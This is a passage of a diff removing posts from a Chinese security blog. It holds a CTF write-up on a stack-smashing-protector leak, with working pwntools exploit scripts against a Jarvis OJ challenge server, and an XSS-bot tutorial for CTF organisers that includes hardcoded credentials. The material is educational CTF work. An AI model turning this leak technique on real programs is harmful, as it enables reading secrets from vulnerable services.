(__int64)&quot;Hello!\nWhat&apos;s your name? &quot;);</div><div class="line">  LODWORD(v0) = _IO_gets(&amp;buffer);</div><div class="line">  if ( !v0 )</div><div class="line">label_exit:</div><div class="line">    _exit(1);</div><div class="line">  v1 = 0LL;</div><div class="line">  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    v2 = _IO_getc(stdin);</div><div class="line">    if ( v2 == -1u )</div><div class="line">      goto label_exit;</div><div class="line">    if ( v2 == &apos;\n&apos; )</div><div class="line">      break;</div><div class="line">    flag[v1++] = v2;</div><div class="line">    if ( v1 == 32 )                             // 32长度</div><div class="line">      goto thank_you;</div><div class="line">  &#125;</div><div class="line">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</div><div class="line">thank_you:</div><div class="line">  puts(&quot;Thank you, bye!&quot;);</div><div class="line">  return *MK_FP(__FS__, 40LL) ^ canary;</div></pre></td></tr></table></figure>
-<p>首先，函数使用了gets(的某种形态？)来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以<code>\n</code>结尾，所以无法绕过canary。</p>
-<p>纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。</p>
-<p>但如果你换个思路，我们故意触发canary的保护会怎么样？</p>
-<p>事实上，就有一种攻击方法叫做<code>SSP（Stack Smashing Protector ） leak</code>。</p>
-<hr>
-<p>如果canary被我们的值覆盖而发生了变化，程序会执行函数<code>___stack_chk_fail()</code></p>
-<p><img src="/images/2017-09-23/canary_7a0eddd01d532e95ac8a905e617c70b4.png" alt="img"></p>
-<p>一般情况下，我们执行了这个函数，输出是这样的：</p>
-<p><img src="/images/2017-09-23/canary_c0f71a7d08460009b1ff313dcdbf0294.png" alt="img"></p>
-<p>我们来看一下源码<br>__stack_chk_fail :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void </div><div class="line">__attribute__ ((noreturn)) </div><div class="line">__stack_chk_fail (void) &#123;   </div><div class="line">	__fortify_fail (&quot;stack smashing detected&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>fortify_fail</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void </div><div class="line">__attribute__ ((noreturn)) </div><div class="line">__fortify_fail (msg)</div><div class="line">   const char *msg; &#123;</div><div class="line">      /* The loop is added only to keep gcc happy. */</div><div class="line">         while (1)</div><div class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </div><div class="line">&#125; </div><div class="line">libc_hidden_def (__fortify_fail)</div></pre></td></tr></table></figure>
-<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风</p>
-<p><img src="/images/2017-09-23/canary_a768142147ca3976598941b5c6c67161.png" alt="img"></p>
-<p>所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p>
-<p>听起来很美妙，我们可以试试看。</p>
-<p>先写如下poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">#cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</div><div class="line">cn = process(&apos;pwn_smashes&apos;)</div><div class="line">cn.recv()</div><div class="line">cn.sendline(p64(0x0000000000400934)*200) #直接用我们所需的地址占满整个栈</div><div class="line">cn.recv()</div><div class="line">cn.sendline()</div><div class="line">cn.recv()</div><div class="line"></div><div class="line">#.rodata:0000000000400934 aHelloWhatSYour db &apos;Hello!&apos;,0Ah         ; DATA XREF: func_1+1o</div><div class="line">#.rodata:0000000000400934                 db &apos;What&apos;,27h,&apos;s your name? &apos;,0</div><div class="line">#.rodata:000000000040094E ; char s[]</div><div class="line">#.rodata:000000000040094E s               db &apos;Thank you, bye!&apos;,0  ; DATA XREF: func_1:loc_400878o</div><div class="line">#.rodata:000000000040095E                 align 20h</div><div class="line">#.rodata:0000000000400960 aNiceToMeetYouS db &apos;Nice to meet you, %s.&apos;,0Ah</div><div class="line">#.rodata:0000000000400960                                         ; DATA XREF: func_1+3Fo</div><div class="line">#.rodata:0000000000400960                 db &apos;Please overwrite the flag: &apos;,0</div><div class="line">#.rodata:0000000000400992                 align 8</div><div class="line">#.rodata:0000000000400992 _rodata         ends</div></pre></td></tr></table></figure>
-<p>输出结果令我们满意</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received 0x56 bytes:</div><div class="line">    &apos;Thank you, bye!\n&apos;</div><div class="line">    &apos;*** stack smashing detected ***: Hello!\n&apos;</div><div class="line">    &quot;What&apos;s your name?  terminated\n&quot;</div></pre></td></tr></table></figure>
-<p>但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</div></pre></td></tr></table></figure>
-<p>所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。</p>
-<p>这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。</p>
-<p><img src="/images/2017-09-23/canary_b17d7868f95d135b35908e74805b7282.png" alt="img"></p>
-<p>可见，其实在0x400d20处存在flag的备份。</p>
-<p>因此，最终的poc为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</div><div class="line">#cn = process(&apos;pwn_smashes&apos;)</div><div class="line">cn.recv()</div><div class="line">cn.sendline(p64(0x0400d20)*200)</div><div class="line">cn.recv()</div><div class="line">cn.sendline()</div><div class="line">cn.recv()</div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/code/Python的图片处理库PIL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/code/Python的图片处理库PIL/" itemprop="url">Python的图片处理库PIL</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T21:02:35+08:00">
-                2017-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>PIL 是Python Image Library的缩写，意思即为Python的图片处理库</p>
-<p>PIL的官方文档是<a href="http://effbot.org/imagingbook/pil-index.htm" target="_blank" rel="external">http://effbot.org/imagingbook/pil-index.htm</a></p>
-<p>内容很全，也不需赘述</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/web/xss-bot介绍/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/web/xss-bot介绍/" itemprop="url">xss bot介绍</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T17:22:02+08:00">
-                2017-09-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-07T00:49:29+08:00">
+                2017-12-07
               </time>
             
 
@@ -1511,723 +1024,16 @@
       
         
           
-            <p>这篇文章摘抄与LoRexxar的的博客<a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
-<p>bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。</p>
-<p>因此xss bot应该具有较强的稳定性！</p>
-<p>xss在近几年的ctf形式中，越来越受到了人们的重视，但是出xss的题目最重要的可能就是xss bot的问题了，一个合格的xss bot要稳定还能避免搅屎。</p>
-<p>下面我们就来看看一个xss bot是怎么完成的。</p>
-<h1 id="1-bot之前"><a href="#1-bot之前" class="headerlink" title="1. bot之前"></a>1. bot之前</h1><p>一般来说，对于xss bot来说，最重要的是要bot能够执行js，事情的本质是我们需要一个浏览器内核来解析js，这里我们一般会用<code>selenium+webdriver</code>。</p>
-<p>而webdriver一般有3种chrome webdriver、firefox webdriver、phantomjs。</p>
-<h2 id="1-1-selenium"><a href="#1-1-selenium" class="headerlink" title="1.1 selenium"></a>1.1 selenium</h2><p>selenium是用来控制webdriver的接口的，网上搜到的大部分脚本大部门都是java控制的，下面我的所有脚本都使用python操作selenium，下面有份不太完整的文档。</p>
-<p><a href="http://www.seleniumhq.org/docs/03_webdriver.jsp" target="_blank" rel="external">http://www.seleniumhq.org/docs/03_webdriver.jsp</a></p>
-<p>只要在python文件前引入selenium模块。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div></pre></td></tr></table></figure>
-<h2 id="1-2-chrome-webdriver"><a href="#1-2-chrome-webdriver" class="headerlink" title="1.2 chrome webdriver"></a>1.2 chrome webdriver</h2><p>如果我们想要使用chrome webdriver，除了安装chrome浏览器本身，还需要安装webdriver。</p>
-<p><a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="external">https://sites.google.com/a/chromium.org/chromedriver/downloads</a></p>
-<p>由于webdriver版本众多，api和语法也有所不同，这里推荐最新版chrome+最新版webdriver。</p>
-<p>因为环境相异，所以我们可能需要在脚本里设置chrome webdriver的路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line">import os </div><div class="line"></div><div class="line">chromedriver = &quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe&quot;  </div><div class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver  </div><div class="line">browser = webdriver.Chrome(chromedriver)  </div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h2 id="1-3-firefox-webdriver"><a href="#1-3-firefox-webdriver" class="headerlink" title="1.3 firefox webdriver"></a>1.3 firefox webdriver</h2><p>firefox和chrome相同，需要一个geckodriver来支持，和chrome类似。</p>
-<p><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="external">https://github.com/mozilla/geckodriver/releases/</a></p>
-<p>在linux下，需要添加映射到/bin/</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x geckodriver</div></pre></td></tr></table></figure>
-<p>在windows下，需要添加geckodriver到环境变量中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">browser = webdriver.Firefox()</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h2 id="1-4-phantomjs"><a href="#1-4-phantomjs" class="headerlink" title="1.4 phantomjs"></a>1.4 phantomjs</h2><p>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持，而且不需要浏览器支持，所以一般爬虫用的比较多。</p>
-<p>下载地址<br><a href="http://phantomjs.org/download.html" target="_blank" rel="external">http://phantomjs.org/download.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver</div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">phantomjs_path = &quot;sssssssss/phantomjs&quot;</div><div class="line">driver = webdriver.PhantomJS(executable_path=phantomjs_path)</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h1 id="2-bot的背后"><a href="#2-bot的背后" class="headerlink" title="2. bot的背后"></a>2. bot的背后</h1><p>比起爬虫来不一样，因为一个爬虫只要打开一次获取数据就好了，但是作为xss bot必须周期性的打开页面，执行攻击者的相应payload，既然bot的持续时间一般是24小时-48小时，那bot就不可能时时刻刻都有人盯着，也就必须放在服务器上，我们来研究一下不同的webdriver在服务器的差异。</p>
-<p>chrome和firefox的webdriver都有一个特点，就是需要桌面，如果执行脚本的服务器上不包含桌面，那么我就需要别的方法来构造一个虚拟的桌面。</p>
-<p>如果在windows服务器上，windows服务器最大的特点就是自带桌面，我们一般通过rdp管理，所以windows服务器上跑xss bot的话不需要做专门的处理。</p>
-<p>如果在linux服务器上，我们一般通过ssh管理linux服务器，那么我就需要一段神秘代码来执行xss bot脚本，这是一段火日聚聚教我的代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from pyvirtualdisplay import Display</div><div class="line"></div><div class="line">display = Display(visible=0, size=(800,800))</div><div class="line">display.start()</div></pre></td></tr></table></figure>
-<p>在phantomjs的webdriver下，就不会有这样的问题，因为phantomjs本身就是多平台的，只是很多时候xss bot需要保证浏览器的特性，这种时候，我们往往不会使用phantomjs作为xss bot的首选。</p>
-<h1 id="3-完成bot"><a href="#3-完成bot" class="headerlink" title="3. 完成bot"></a>3. 完成bot</h1><p>上面我们着重讲了各种webdriver，下面我就来针对不同的xss题目来谈谈。</p>
-<h2 id="3-1-report-bug型xss"><a href="#3-1-report-bug型xss" class="headerlink" title="3.1 report bug型xss"></a>3.1 report bug型xss</h2><p>一般来说，xss题目最常见的就是report bug或者是留言型xss，后台接口唯一，攻击者向目标发送信息，bot需要访问页面执行js。</p>
-<p>在ctf比赛中，处理方式五花八门，这里我推荐1种解决办法。</p>
-<p>在攻击者页面提供测试接口和攻击接口，然后攻击者接口设置验证码，避免攻击者无意义的刷payload。（具体可以见0ctf的处理方式）</p>
-<p>为了避免干扰，最好将攻击者攻击数据存入数据库，添加标志位以判断数据是否被访问过，题目专门添加功能用作check数据库内是否存在未访问数据（最好添加此功能在题目中，因为bot有可能不在题目服务器，远程数据库连接是个危险的行为！！）</p>
-<p>判断存在时，bot开启webdriver访问相应的页面（通过添加cookie或者ip check的方式判断访问来源），相应的页面从数据库取出数据，bot访问完成后关闭。</p>
-<p>大致流程如下：</p>
-<p><img src="/images/2017-09-21/image_1bepoa4nsjb91ipsli170tclt9.png" alt="image_1bepoa4nsjb91ipsli170tclt9.png-31.8kB"></p>
-<p>我这里贴上bot部分的代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = requests.Session()</div><div class="line">		url = <span class="string">'http://xxx/checksql.php'</span></div><div class="line">		r = s.get(url)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"存在"</span> <span class="keyword">in</span> r.text:</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				chromedriver = <span class="string">"C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe"</span>  </div><div class="line">				os.environ[<span class="string">"webdriver.chrome.driver"</span>] = chromedriver  </div><div class="line">				browser = webdriver.Chrome(chromedriver) </div><div class="line">				</div><div class="line">				browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">				browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">				url = <span class="string">"http://xxxxxx/admin_321321321.php"</span>  	</div><div class="line">				browser.get(url)</div><div class="line">				browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">				 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">				 <span class="string">'path'</span> : <span class="string">'/'</span>&#125;)</div><div class="line"></div><div class="line"></div><div class="line">				browser.get(url)</div><div class="line">				<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">					<span class="keyword">try</span>:</div><div class="line">						browser.switch_to_alert().accept()</div><div class="line">					<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">						<span class="keyword">break</span></div><div class="line">				<span class="keyword">print</span> browser.title</div><div class="line">				<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">				time.sleep(<span class="number">10</span>)</div><div class="line">				browser.quit()</div><div class="line">				time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">				<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div><div class="line">				browser.quit()</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">			<span class="keyword">print</span> <span class="string">"[info] no unread messages"</span></div><div class="line">			exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div></pre></td></tr></table></figure>
-<p>上面的代码配合crontab应该可以很好的应付这类xss的各种问题</p>
-<h2 id="3-2-聊天类的交互式xss"><a href="#3-2-聊天类的交互式xss" class="headerlink" title="3.2 聊天类的交互式xss"></a>3.2 聊天类的交互式xss</h2><p>这类xss最明显的特点    就是admin用户和别的用户并没有区别，也就是说bot想要打开被攻击者注入的页面，也必须经过登录，服务端设置session来登录，那么上面的办法就行不通了，最好的办法就是模拟登录。</p>
-<p>这类xss最大的问题其实就是信息的隔离方式，如果聊天的交互方式本身就是显示在同一页面上的话，很显然的问题就是，如果有一个攻击者试图干扰bot的运行，他只要再每个round发送<code>&lt;xmp&gt;</code>就可以导致js无法执行，这是个我到现在还没想明白的问题。先分享现在我使用的bot</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</div><div class="line"></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		browser = webdriver.Firefox()</div><div class="line">		browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">		browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">		url = <span class="string">"http://52.80.63.91/login.php"</span>  	</div><div class="line">		browser.get(url)</div><div class="line"></div><div class="line">		elem = browser.find_element_by_name(<span class="string">"user"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admin'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"pass"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admmin332indadmin33213'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"login"</span>)</div><div class="line">		elem.click()</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"login success"</span></div><div class="line">	</div><div class="line">		browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">		 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">		 <span class="string">'path'</span> : <span class="string">'/adminshigesha233e3333/'</span>&#125;)</div><div class="line"></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				browser.switch_to_alert().accept()</div><div class="line"></div><div class="line">			<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> browser.title</div><div class="line">		<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">		time.sleep(<span class="number">10</span>)</div><div class="line">		browser.quit()</div><div class="line">		time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[ERROR] "</span>+str(e)</div><div class="line">		<span class="comment">#important</span></div><div class="line">		browser.quit()</div><div class="line"></div><div class="line"></div><div class="line">url2 = <span class="string">'http://xxxx/cl33e3ar5ql.php'</span></div><div class="line">r = s.get(url2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.text</div><div class="line"><span class="keyword">print</span> time.strftime(<span 